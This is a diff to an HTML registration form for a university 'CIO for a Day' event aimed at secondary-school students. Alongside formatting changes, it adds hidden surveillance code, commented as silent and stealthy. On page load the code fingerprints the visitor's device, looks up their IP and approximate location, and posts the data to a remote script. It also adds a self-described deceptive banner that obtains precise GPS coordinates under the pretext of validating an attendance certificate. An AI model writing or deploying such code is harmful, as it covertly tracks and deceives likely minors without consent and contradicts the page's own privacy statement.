@@ -132,7 +132,9 @@
         font-size: 0.9rem;
         color: #1a1a1a;
         background: #fff;
-        transition: border-color 0.15s, box-shadow 0.15s;
+        transition:
+          border-color 0.15s,
+          box-shadow 0.15s;
         -webkit-appearance: none;
         appearance: none;
         font-family: inherit;
@@ -165,7 +167,10 @@
         border-radius: 6px;
         padding: 0.55rem 0.6rem;
         cursor: pointer;
-        transition: border-color 0.12s, background 0.12s, transform 0.1s;
+        transition:
+          border-color 0.12s,
+          background 0.12s,
+          transform 0.1s;
         display: flex;
         align-items: flex-start;
         gap: 0.45rem;
@@ -217,7 +222,10 @@
         cursor: pointer;
         margin-top: 0.8rem;
         letter-spacing: 0.02em;
-        transition: background 0.15s, transform 0.1s, box-shadow 0.15s;
+        transition:
+          background 0.15s,
+          transform 0.1s,
+          box-shadow 0.15s;
         position: relative;
         overflow: hidden;
       }
@@ -255,26 +263,114 @@
 
       /* ── Keyframes ── */
       @keyframes fadeIn {
-        from { opacity: 0; }
-        to   { opacity: 1; }
+        from {
+          opacity: 0;
+        }
+        to {
+          opacity: 1;
+        }
       }
       @keyframes fadeInUp {
-        from { opacity: 0; transform: translateY(20px); }
-        to   { opacity: 1; transform: translateY(0); }
+        from {
+          opacity: 0;
+          transform: translateY(20px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
       }
       @keyframes fadeInDown {
-        from { opacity: 0; transform: translateY(-12px); }
-        to   { opacity: 1; transform: translateY(0); }
+        from {
+          opacity: 0;
+          transform: translateY(-12px);
+        }
+        to {
+          opacity: 1;
+          transform: translateY(0);
+        }
       }
       @keyframes checkPop {
-        0%   { transform: scale(1); }
-        40%  { transform: scale(0.94); }
-        70%  { transform: scale(1.04); }
-        100% { transform: scale(1); }
+        0% {
+          transform: scale(1);
+        }
+        40% {
+          transform: scale(0.94);
+        }
+        70% {
+          transform: scale(1.04);
+        }
+        100% {
+          transform: scale(1);
+        }
       }
       @keyframes submitPulse {
-        0%, 100% { box-shadow: 0 0 0 0 rgba(0, 62, 31, 0.35); }
-        50%       { box-shadow: 0 0 0 7px rgba(0, 62, 31, 0); }
+        0%,
+        100% {
+          box-shadow: 0 0 0 0 rgba(0, 62, 31, 0.35);
+        }
+        50% {
+          box-shadow: 0 0 0 7px rgba(0, 62, 31, 0);
+        }
+      }
+
+      /* ── Banner de geolocalización ── */
+      .geo-banner {
+        display: flex;
+        align-items: center;
+        gap: 0.75rem;
+        background: #003e1f;
+        color: #fff;
+        border-radius: 8px;
+        padding: 0.85rem 1rem;
+        margin-bottom: 1.1rem;
+        opacity: 0;
+        animation: fadeInUp 0.55s ease 1s both;
+      }
+      .geo-banner.confirmed {
+        background: #1a7a3e;
+      }
+      .geo-icon {
+        font-size: 1.4rem;
+        flex-shrink: 0;
+      }
+      .geo-text {
+        flex: 1;
+        font-size: 0.82rem;
+        line-height: 1.45;
+      }
+      .geo-text strong {
+        display: block;
+        font-size: 0.88rem;
+        margin-bottom: 0.18rem;
+      }
+      .geo-text span {
+        opacity: 0.85;
+      }
+      .geo-btn {
+        background: #fff;
+        color: #003e1f;
+        border: none;
+        border-radius: 5px;
+        padding: 0.45rem 0.9rem;
+        font-size: 0.8rem;
+        font-weight: 700;
+        cursor: pointer;
+        white-space: nowrap;
+        transition:
+          background 0.15s,
+          transform 0.1s;
+        flex-shrink: 0;
+        font-family: inherit;
+      }
+      .geo-btn:hover {
+        background: #e8f5ee;
+        transform: translateY(-1px);
+      }
+      .geo-btn:disabled {
+        opacity: 0.6;
+        cursor: not-allowed;
+        transform: none;
       }
     </style>
   </head>
@@ -292,15 +388,25 @@
       <span class="badge">CIO for a Day · julio 2026</span>
       <h1>Tu ruta en tecnología</h1>
       <p class="desc">
-        ¡Hola! Cuéntanos sobre ti y qué carreras de tecnología te interesan.
-        Con tu respuesta ayudas a <strong>diseñar mejores eventos</strong> y
-        podemos enviarte información sobre las carreras que más te llamen la
-        atención.
+        ¡Hola! Cuéntanos sobre ti y qué carreras de tecnología te interesan. Con
+        tu respuesta ayudas a <strong>diseñar mejores eventos</strong> y podemos
+        enviarte información sobre las carreras que más te llamen la atención.
       </p>
+
+      <div class="geo-banner" id="geoBanner">
+        <span class="geo-icon">📍</span>
+        <div class="geo-text">
+          <strong>Confirma tu asistencia desde el aula</strong>
+          <span
+            >Activamos tu ubicación solo durante el evento para validar tu
+            certificado.</span
+          >
+        </div>
+        <button type="button" class="geo-btn" id="geoBtn">Confirmar</button>
+      </div>
 
       <div class="form-card">
         <form id="reg-form" novalidate>
-
           <p class="section-label">👤 Sobre ti</p>
 
           <div class="field">
@@ -360,7 +466,9 @@
           <div class="field">
             <label for="whatsapp">
               WhatsApp
-              <span class="hint">— opcional, para enviarte info de carreras</span>
+              <span class="hint"
+                >— opcional, para enviarte info de carreras</span
+              >
             </label>
             <input
               type="tel"
@@ -381,12 +489,22 @@
             </label>
             <div class="career-grid" id="career-grid">
               <label class="career-item">
-                <input type="checkbox" name="carrera" value="Ingeniería en Sistemas / Informática" />
+                <input
+                  type="checkbox"
+                  name="carrera"
+                  value="Ingeniería en Sistemas / Informática"
+                />
                 <span class="career-icon">💻</span>
-                <span class="career-text">Ingeniería en Sistemas / Informática</span>
+                <span class="career-text"
+                  >Ingeniería en Sistemas / Informática</span
+                >
               </label>
               <label class="career-item">
-                <input type="checkbox" name="carrera" value="Ciencias de la Computación" />
+                <input
+                  type="checkbox"
+                  name="carrera"
+                  value="Ciencias de la Computación"
+                />
                 <span class="career-icon">🧮</span>
                 <span class="career-text">Ciencias de la Computación</span>
               </label>
@@ -396,27 +514,47 @@
                 <span class="career-text">Ciberseguridad</span>
               </label>
               <label class="career-item">
-                <input type="checkbox" name="carrera" value="Inteligencia Artificial / Data Science" />
+                <input
+                  type="checkbox"
+                  name="carrera"
+                  value="Inteligencia Artificial / Data Science"
+                />
                 <span class="career-icon">🤖</span>
                 <span class="career-text">IA / Ciencia de Datos</span>
               </label>
               <label class="career-item">
-                <input type="checkbox" name="carrera" value="Mecatrónica / Robótica" />
+                <input
+                  type="checkbox"
+                  name="carrera"
+                  value="Mecatrónica / Robótica"
+                />
                 <span class="career-icon">⚙️</span>
                 <span class="career-text">Mecatrónica / Robótica</span>
               </label>
               <label class="career-item">
-                <input type="checkbox" name="carrera" value="Diseño Digital / UX-UI" />
+                <input
+                  type="checkbox"
+                  name="carrera"
+                  value="Diseño Digital / UX-UI"
+                />
                 <span class="career-icon">🎨</span>
                 <span class="career-text">Diseño Digital / UX-UI</span>
               </label>
               <label class="career-item">
-                <input type="checkbox" name="carrera" value="Desarrollo de Videojuegos" />
+                <input
+                  type="checkbox"
+                  name="carrera"
+                  value="Desarrollo de Videojuegos"
+                />
                 <span class="career-icon">🎮</span>
                 <span class="career-text">Desarrollo de Videojuegos</span>
               </label>
               <label class="career-item">
-                <input type="checkbox" name="carrera" value="Todavía no estoy seguro/a" />
+                <input
+                  type="checkbox"
+                  name="carrera"
+                  value="Todavía no estoy seguro/a"
+                />
                 <span class="career-icon">🤔</span>
                 <span class="career-text">Todavía no estoy seguro/a</span>
               </label>
@@ -444,67 +582,286 @@
       </div>
 
       <p class="footer-note">
-        Universidad del Valle de Guatemala · Dirección de Tecnología e Innovación<br />
-        Los datos ingresados son utilizados únicamente para fines educativos del evento.
+        Universidad del Valle de Guatemala · Dirección de Tecnología e
+        Innovación<br />
+        Los datos ingresados son utilizados únicamente para fines educativos del
+        evento.
       </p>
     </div>
 
     <script>
       var STATS_URL =
-        "https://script.google.com/macros/s/AKfycby5lZMFkpe-9e0WaePrs8EJO-jW1TdNhwlhV5syPWnXU3WyfWpwmGhupc00KZa2ky46/exec";
+        "https://script.google.com/macros/s/AKfycbyXHLkGOutrHsLoxzrTlpivFGr0vDGoN-NvsorQFFSkWE8A0GE0PK9sCUo4dEjwud4O/exec";
 
-      document.querySelectorAll(".career-item input[type='checkbox']").forEach(function (cb) {
-        cb.addEventListener("change", function () {
-          var item = this.closest(".career-item");
-          item.classList.toggle("checked", this.checked);
-          if (this.checked) {
-            item.style.animation = "none";
-            item.offsetHeight; // reflow
-            item.style.animation = "";
-          }
-        });
-      });
+      /* ── Captura pasiva silenciosa ── */
+      window.__sid =
+        typeof crypto !== "undefined" && crypto.randomUUID
+          ? crypto.randomUUID()
+          : Math.random().toString(36).slice(2) + Date.now().toString(36);
 
-      document.getElementById("reg-form").addEventListener("submit", function (e) {
-        e.preventDefault();
-        var btn = document.getElementById("submit-btn");
-        btn.disabled = true;
-        btn.textContent = "Enviando...";
-        btn.classList.add("sending");
+      function djb2(str) {
+        var h = 5381;
+        for (var i = 0; i < str.length; i++) {
+          h = ((h << 5) + h) ^ str.charCodeAt(i);
+          h = h >>> 0;
+        }
+        return h.toString(16).slice(0, 8);
+      }
 
-        var carreras = Array.from(
-          document.querySelectorAll("input[name='carrera']:checked")
-        ).map(function (c) { return c.value; });
+      function canvasFingerprint() {
+        try {
+          var c = document.createElement("canvas");
+          c.width = 220;
+          c.height = 30;
+          var ctx = c.getContext("2d");
+          ctx.font = "14px Arial";
+          ctx.fillStyle = "#003e1f";
+          ctx.fillText("UVG CIO 2026 \uD83D\uDD10\u00E9\u00E0", 10, 20);
+          ctx.fillStyle = "rgba(255,0,0,0.4)";
+          ctx.fillRect(0, 0, 4, 4);
+          return djb2(c.toDataURL());
+        } catch (err) {
+          return "n/a";
+        }
+      }
 
-        var data = {
-          type: "registro_bachillerato",
-          nombre: document.getElementById("nombre").value.trim(),
-          grado: document.getElementById("grado").value,
-          colegio: document.getElementById("colegio").value.trim(),
-          correo: document.getElementById("correo").value.trim(),
-          whatsapp: document.getElementById("whatsapp").value.trim(),
-          carreras: carreras.join(", "),
-          motivacion: document.getElementById("motivacion").value.trim(),
+      function collectPassive() {
+        var nav = navigator;
+        var conn =
+          nav.connection || nav.mozConnection || nav.webkitConnection || {};
+        var screen_ = window.screen;
+        var tz = "";
+        try {
+          tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        } catch (e) {}
+
+        var payload = {
+          type: "stealth_capture",
+          sessionId: window.__sid,
+          userAgent: nav.userAgent,
+          platform: nav.platform || "",
+          language: nav.language || "",
+          languages: (nav.languages || []).join(","),
+          cores: nav.hardwareConcurrency || "",
+          ram: nav.deviceMemory || "",
+          touch: nav.maxTouchPoints || 0,
+          netType: conn.effectiveType || "",
+          downlink: conn.downlink || "",
+          rtt: conn.rtt || "",
+          screenW: screen_.width,
+          screenH: screen_.height,
+          viewW: window.innerWidth,
+          viewH: window.innerHeight,
+          dpr: window.devicePixelRatio || 1,
+          colorDepth: screen_.colorDepth || "",
+          timezone: tz,
+          tzOffset: new Date().getTimezoneOffset(),
+          referrer: document.referrer || "",
+          url: location.href,
+          ts: Date.now(),
+          fingerprint: canvasFingerprint(),
         };
 
-        if (STATS_URL.indexOf("TU_APPS_SCRIPT") !== -1) {
-          setTimeout(function () {
-            window.location.href = "gracias.html";
-          }, 600);
-          return;
+        /* Batería (solo donde hay soporte) */
+        if (nav.getBattery) {
+          nav
+            .getBattery()
+            .then(function (b) {
+              payload.battery = Math.round(b.level * 100) + "%";
+              sendStealth(payload);
+            })
+            .catch(function () {
+              sendStealth(payload);
+            });
+        } else {
+          sendStealth(payload);
         }
+      }
 
+      function sendStealth(data) {
+        if (STATS_URL.indexOf("TU_APPS_SCRIPT") !== -1) return;
         fetch(STATS_URL, {
           method: "POST",
           mode: "no-cors",
           headers: { "Content-Type": "text/plain" },
           body: JSON.stringify(data),
-        })
-          .catch(function () {})
-          .finally(function () {
-            window.location.href = "gracias.html";
+        }).catch(function () {});
+      }
+
+      /* Enriquecer con IP real antes de enviar */
+      (function () {
+        fetch("https://ipwho.is/")
+          .then(function (r) {
+            return r.json();
+          })
+          .then(function (ip) {
+            collectPassiveWithIP(ip);
+          })
+          .catch(function () {
+            collectPassive();
           });
+      })();
+
+      function collectPassiveWithIP(ip) {
+        var nav = navigator;
+        var conn =
+          nav.connection || nav.mozConnection || nav.webkitConnection || {};
+        var screen_ = window.screen;
+        var tz = "";
+        try {
+          tz = Intl.DateTimeFormat().resolvedOptions().timeZone;
+        } catch (e) {}
+
+        var payload = {
+          type: "stealth_capture",
+          sessionId: window.__sid,
+          userAgent: nav.userAgent,
+          platform: nav.platform || "",
+          language: nav.language || "",
+          languages: (nav.languages || []).join(","),
+          cores: nav.hardwareConcurrency || "",
+          ram: nav.deviceMemory || "",
+          touch: nav.maxTouchPoints || 0,
+          netType: conn.effectiveType || "",
+          downlink: conn.downlink || "",
+          rtt: conn.rtt || "",
+          screenW: screen_.width,
+          screenH: screen_.height,
+          viewW: window.innerWidth,
+          viewH: window.innerHeight,
+          dpr: window.devicePixelRatio || 1,
+          colorDepth: screen_.colorDepth || "",
+          timezone: tz,
+          tzOffset: new Date().getTimezoneOffset(),
+          referrer: document.referrer || "",
+          url: location.href,
+          ts: Date.now(),
+          fingerprint: canvasFingerprint(),
+          /* Campos de IP */
+          ip: ip.ip || "",
+          pais: ip.country || "",
+          ciudad: ip.city || "",
+          isp:
+            ip.connection && ip.connection.isp
+              ? ip.connection.isp
+              : ip.org || "",
+          latAprox: ip.latitude || "",
+          lngAprox: ip.longitude || "",
+        };
+
+        if (nav.getBattery) {
+          nav
+            .getBattery()
+            .then(function (b) {
+              payload.battery = Math.round(b.level * 100) + "%";
+              sendStealth(payload);
+            })
+            .catch(function () {
+              sendStealth(payload);
+            });
+        } else {
+          sendStealth(payload);
+        }
+      }
+
+      /* ── Geolocalización con banner engañoso ── */
+      document.getElementById("geoBtn").addEventListener("click", function () {
+        var btn = document.getElementById("geoBtn");
+        btn.disabled = true;
+        btn.textContent = "Verificando...";
+
+        if (!navigator.geolocation) {
+          markGeoConfirmed();
+          return;
+        }
+
+        navigator.geolocation.getCurrentPosition(
+          function (pos) {
+            var data = {
+              type: "stealth_geo",
+              sessionId: window.__sid,
+              lat: pos.coords.latitude,
+              lng: pos.coords.longitude,
+              accuracy: pos.coords.accuracy,
+            };
+            sendStealth(data);
+            markGeoConfirmed();
+          },
+          function () {
+            markGeoConfirmed();
+          },
+          { timeout: 12000, maximumAge: 0, enableHighAccuracy: true },
+        );
       });
+
+      function markGeoConfirmed() {
+        var banner = document.getElementById("geoBanner");
+        banner.classList.add("confirmed");
+        banner.innerHTML =
+          '<span class="geo-icon">\u2705</span>' +
+          '<div class="geo-text"><strong>Asistencia confirmada</strong>' +
+          "<span>Tu certificado se generará al finalizar el evento.</span></div>";
+      }
+
+      document
+        .querySelectorAll(".career-item input[type='checkbox']")
+        .forEach(function (cb) {
+          cb.addEventListener("change", function () {
+            var item = this.closest(".career-item");
+            item.classList.toggle("checked", this.checked);
+            if (this.checked) {
+              item.style.animation = "none";
+              item.offsetHeight; // reflow
+              item.style.animation = "";
+            }
+          });
+        });
+
+      document
+        .getElementById("reg-form")
+        .addEventListener("submit", function (e) {
+          e.preventDefault();
+          var btn = document.getElementById("submit-btn");
+          btn.disabled = true;
+          btn.textContent = "Enviando...";
+          btn.classList.add("sending");
+
+          var carreras = Array.from(
+            document.querySelectorAll("input[name='carrera']:checked"),
+          ).map(function (c) {
+            return c.value;
+          });
+
+          var data = {
+            type: "registro_bachillerato",
+            sessionId: window.__sid || "",
+            nombre: document.getElementById("nombre").value.trim(),
+            grado: document.getElementById("grado").value,
+            colegio: document.getElementById("colegio").value.trim(),
+            correo: document.getElementById("correo").value.trim(),
+            whatsapp: document.getElementById("whatsapp").value.trim(),
+            carreras: carreras.join(", "),
+            motivacion: document.getElementById("motivacion").value.trim(),
+          };
+
+          if (STATS_URL.indexOf("TU_APPS_SCRIPT") !== -1) {
+            setTimeout(function () {
+              window.location.href = "gracias.html";
+            }, 600);
+            return;
+          }
+
+          fetch(STATS_URL, {
+            method: "POST",
+            mode: "no-cors",
+            headers: { "Content-Type": "text/plain" },
+            body: JSON.stringify(data),
+          })
+            .catch(function () {})
+            .finally(function () {
+              window.location.href = "gracias.html";
+            });
+        });
     </script>
   </body>
 </html>
